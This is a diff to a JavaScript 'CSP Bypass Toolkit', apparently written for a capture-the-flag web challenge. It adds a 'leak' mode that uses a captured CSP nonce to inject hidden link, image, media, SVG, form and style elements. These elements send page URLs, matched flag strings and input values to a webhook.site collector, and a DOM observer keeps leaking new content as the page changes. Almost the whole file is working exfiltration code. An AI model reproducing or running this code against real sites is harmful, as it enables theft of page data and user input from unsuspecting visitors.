@@ -1,7 +1,9 @@
 // CSP Bypass Toolkit - Nonce Extraction, Style Injection, and Data Exfiltration
 // Author: Security Research Tool
 // Purpose: Educational/Research CSP bypass techniques
-
+/*
+Content-Security-Policy: default-src unpkg.com fonts.gstatic.com cdn.jsdelivr.net; style-src 'nonce-FEcgTSCJufmyU2eAVb4RKw==' unpkg.com fonts.googleapis.com cdn.jsdelivr.net;
+*/
 console.log('🔥 CSP Bypass Toolkit Loaded');
 
 // ===================================
@@ -99,6 +101,8 @@ const StyleInjector = {
                 return this.injectHunter(nonce);
             case 'vomp':
                 return this.injectVomp(nonce);
+            case 'leak':
+                return this.injectAllLeaks(nonce);
             default:
                 return this.injectBasic(nonce);
         }
@@ -205,6 +209,162 @@ const StyleInjector = {
     
     injectHunter(nonce) {
         return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/flag_hunter.css');
+    },
+
+    injectAllLeaks(nonce) {
+        console.log('💥 [INJECT] Deploying comprehensive HTTP leak arsenal...');
+        
+        // 1. Load comprehensive leak CSS file
+        const cssResult = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/leaks.css');
+        
+        // 2. HTML Element Injection for additional leak vectors
+        this.injectHTMLLeaks(nonce);
+        
+        console.log('✅ [INJECT] Comprehensive leak vectors deployed');
+        return cssResult;
+    },
+
+    injectHTMLLeaks(nonce) {
+        console.log('🔗 [INJECT] Injecting HTML-based leak elements...');
+        
+        // Create container for leak elements
+        const container = document.createElement('div');
+        container.style.display = 'none';
+        container.innerHTML = `
+            <!-- Link-based leaks -->
+            <link rel="dns-prefetch" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=dns_prefetch&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
+            <link rel="preconnect" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=preconnect&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
+            <link rel="prefetch" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=prefetch&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
+            <link rel="preload" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=preload&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
+            
+            <!-- Image-based leaks -->
+            <img src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=img_src&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
+            <img srcset="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=img_srcset&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
+            <img lowsrc="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=img_lowsrc&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
+            
+            <!-- Object/Embed leaks -->
+            <object data="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=object_data&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}"></object>
+            <embed src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=embed_src&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
+            
+            <!-- Audio/Video leaks -->
+            <audio src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=audio_src&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}"></audio>
+            <video poster="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=video_poster&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
+                <source src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=video_source&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
+                <track src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=video_track&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
+            </video>
+            
+            <!-- SVG-based leaks -->
+            <svg style="display:none;" nonce="${nonce}">
+                <image href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=svg_image&page=${encodeURIComponent(location.href)}"></image>
+                <feImage href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=svg_feimage&page=${encodeURIComponent(location.href)}"></feImage>
+            </svg>
+            
+            <!-- Form leaks -->
+            <form action="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=form_action&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}"></form>
+            
+            <!-- Input image leak -->
+            <input type="image" src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=input_image&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
+        `;
+        
+        document.body.appendChild(container);
+        
+        // Additional dynamic leaks
+        this.createDynamicLeaks(nonce);
+    },
+
+    createDynamicLeaks(nonce) {
+        console.log('⚡ [INJECT] Creating dynamic leak triggers...');
+        
+        // Create dynamic CSS leak based on page content
+        const pageText = document.body.textContent.toLowerCase();
+        
+        if (pageText.includes('flag')) {
+            const dynamicStyle = document.createElement('style');
+            dynamicStyle.setAttribute('nonce', nonce);
+            dynamicStyle.textContent = `
+                body {
+                    background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=dynamic_text_detection&content=flag_found&page=${encodeURIComponent(location.href)}');
+                }
+            `;
+            document.head.appendChild(dynamicStyle);
+        }
+        
+        // Check for specific flag patterns in text content
+        const flagPatterns = [
+            /flag\{[^}]+\}/gi,
+            /ctf\{[^}]+\}/gi,
+            /[A-Za-z0-9_]+\{[^}]+\}/gi
+        ];
+        
+        flagPatterns.forEach((pattern, index) => {
+            const matches = pageText.match(pattern);
+            if (matches) {
+                matches.forEach((match, matchIndex) => {
+                    const leakStyle = document.createElement('style');
+                    leakStyle.setAttribute('nonce', nonce);
+                    leakStyle.textContent = `
+                        html {
+                            background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=pattern_match&pattern=${index}&match=${matchIndex}&flag=${encodeURIComponent(match)}&page=${encodeURIComponent(location.href)}');
+                        }
+                    `;
+                    document.head.appendChild(leakStyle);
+                });
+            }
+        });
+        
+        // Monitor for DOM changes and create new leaks
+        this.setupDOMObserver(nonce);
+    },
+
+    setupDOMObserver(nonce) {
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                if (mutation.type === 'childList') {
+                    mutation.addedNodes.forEach((node) => {
+                        if (node.nodeType === Node.ELEMENT_NODE) {
+                            this.scanNewElement(node, nonce);
+                        }
+                    });
+                }
+            });
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    },
+
+    scanNewElement(element, nonce) {
+        // Check if new element contains flag-related content
+        const text = element.textContent?.toLowerCase() || '';
+        const html = element.outerHTML?.toLowerCase() || '';
+        
+        if (text.includes('flag') || html.includes('flag')) {
+            const leakStyle = document.createElement('style');
+            leakStyle.setAttribute('nonce', nonce);
+            leakStyle.textContent = `
+                body {
+                    background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=dom_mutation&type=new_element&content=flag_detected&page=${encodeURIComponent(location.href)}');
+                }
+            `;
+            document.head.appendChild(leakStyle);
+        }
+        
+        // Check for specific input values
+        if (element.tagName === 'INPUT' && element.value) {
+            const value = element.value.toLowerCase();
+            if (value.includes('flag') || value.includes('ctf')) {
+                const leakStyle = document.createElement('style');
+                leakStyle.setAttribute('nonce', nonce);
+                leakStyle.textContent = `
+                    body {
+                        background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=dynamic_input&value=${encodeURIComponent(element.value)}&page=${encodeURIComponent(location.href)}');
+                    }
+                `;
+                document.head.appendChild(leakStyle);
+            }
+        }
     }
 };
 
@@ -297,7 +457,7 @@ const DataExfiltrator = {
         }));
     },
     
-    exfiltrate(data, method = 'console') {
+    exfiltrate(data, method = 'console', nonce = null) {
         console.log('🚀 [EXFILL] Exfiltrating data via:', method);
         
         switch (method) {
@@ -305,10 +465,10 @@ const DataExfiltrator = {
                 this.exfiltrateConsole(data);
                 break;
             case 'css':
-                this.exfiltrateCSS(data);
+                this.exfiltrateCSS(data, nonce);
                 break;
             case 'image':
-                this.exfiltrateImage(data);
+                this.exfiltrateImage(data, nonce);
                 break;
             case 'fetch':
                 this.exfiltrateFetch(data);
@@ -322,43 +482,43 @@ const DataExfiltrator = {
         console.table(data);
     },
     
-    exfiltrateCSS(data) {
-        // CSS-based exfiltration using background images
+    exfiltrateCSS(data, nonce) {
+        // CSS-based exfiltration using background images - requires nonce for CSP bypass
+        if (!nonce) {
+            console.log('❌ [EXFILL] CSS exfiltration failed - no nonce provided');
+            return;
+        }
         const encoded = btoa(JSON.stringify(data));
         const style = document.createElement('style');
+        style.setAttribute('nonce', nonce);
         style.textContent = `
             body { 
                 background-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497?data=${encoded}'); 
             }
         `;
         document.head.appendChild(style);
-        console.log('🎨 [EXFILL] CSS exfiltration attempted');
+        console.log('🎨 [EXFILL] CSS exfiltration attempted with nonce');
     },
     
-    exfiltrateImage(data) {
+    exfiltrateImage(data, nonce) {
+        // Image-based exfiltration - requires nonce for CSP bypass
+        if (!nonce) {
+            console.log('❌ [EXFILL] Image exfiltration failed - no nonce provided');
+            return;
+        }
         const encoded = btoa(JSON.stringify(data));
         const img = document.createElement('img');
+        img.setAttribute('nonce', nonce);
         img.src = `https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497?data=${encoded}`;
         img.style.display = 'none';
         document.body.appendChild(img);
-        console.log('🖼️ [EXFILL] Image exfiltration attempted');
+        console.log('🖼️ [EXFILL] Image exfiltration attempted with nonce');
     },
     
     exfiltrateFetch(data) {
-        // Note: This would likely be blocked by CSP
-        try {
-            fetch('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497', {
-                method: 'POST',
-                body: JSON.stringify(data),
-                headers: { 'Content-Type': 'application/json' }
-            }).then(() => {
-                console.log('🌐 [EXFILL] Fetch exfiltration successful');
-            }).catch(err => {
-                console.log('❌ [EXFILL] Fetch blocked by CSP:', err);
-            });
-        } catch (err) {
-            console.log('❌ [EXFILL] Fetch error:', err);
-        }
+        // ❌ REMOVED: Fetch will always be blocked by CSP connect-src directive
+        console.log('❌ [EXFILL] Fetch method disabled - always blocked by CSP connect-src');
+        console.log('💡 [EXFILL] Use CSS or Image exfiltration instead');
     }
 };
 
@@ -605,7 +765,7 @@ const CSPBypass = {
             case 'exfill':
                 StyleInjector.inject(nonce, 'exfill');
                 const data = DataExfiltrator.collect();
-                DataExfiltrator.exfiltrate(data, 'console');
+                DataExfiltrator.exfiltrate(data, 'console', nonce);
                 break;
                 
             case 'hunter':
@@ -625,9 +785,16 @@ const CSPBypass = {
                     timestamp: new Date().toISOString()
                 };
                 console.log('🚩 [MAIN] Flags found:', flags);
-                DataExfiltrator.exfiltrate(flagData, 'fetch');
-                DataExfiltrator.exfiltrate(flagData, 'image');
-                DataExfiltrator.exfiltrate(flagData, 'console');
+                DataExfiltrator.exfiltrate(flagData, 'fetch', nonce);
+                DataExfiltrator.exfiltrate(flagData, 'image', nonce);
+                DataExfiltrator.exfiltrate(flagData, 'console', nonce);
+                break;
+                
+            case 'leak':
+                console.log('💥 [MAIN] Deploying comprehensive HTTP leak arsenal...');
+                StyleInjector.inject(nonce, 'leak');
+                const leakData = DataExfiltrator.collect();
+                DataExfiltrator.exfiltrate(leakData, 'console', nonce);
                 break;
                 
             case 'all':
@@ -637,10 +804,11 @@ const CSPBypass = {
                 StyleInjector.inject(nonce, 'comp');
                 StyleInjector.inject(nonce, 'exfill');
                 StyleInjector.inject(nonce, 'hunter');
+                StyleInjector.inject(nonce, 'leak');
                 const fullData = DataExfiltrator.collect();
                 const huntResults = Hunter.hunt();
-                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'console');
-                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'fetch');
+                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'console', nonce);
+                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'fetch', nonce);
                 break;
         }
         
@@ -668,5 +836,4 @@ window.runVomp = () => CSPBypass.run('vomp');
 window.runExfill = () => CSPBypass.run('exfill');
 window.runHunter = () => CSPBypass.run('hunter');
 window.runFlag = () => CSPBypass.run('flag');
-
-console.log('🔥 CSP Bypass Toolkit Ready - Use CSPBypass.run() or window.runBasic/runComp/runVomp/runExfill/runHunter/runFlag()'); 
+window.runLeak = () => CSPBypass.run('leak');
